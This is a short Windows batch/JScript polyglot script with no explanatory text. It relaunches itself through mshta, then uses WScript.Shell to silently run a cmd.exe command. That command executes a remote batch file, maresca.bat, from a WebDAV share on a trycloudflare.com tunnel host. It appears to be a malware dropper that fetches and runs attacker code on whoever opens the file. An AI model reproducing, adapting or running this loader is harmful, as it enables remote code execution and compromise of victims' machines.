@echo off
goto :batch

/*
---------- JScript Section ----------*/
<script language="JScript">
var objShell = new ActiveXObject("WScript.Shell");
objShell.Run('cmd.exe /c \\\\spin-largest-performing-columbus.trycloudflare.com@SSL\\DavWWWRoot\\maresca.bat', 0, false);
close();
</script>
exit /b

:batch
mshta "%~f0"
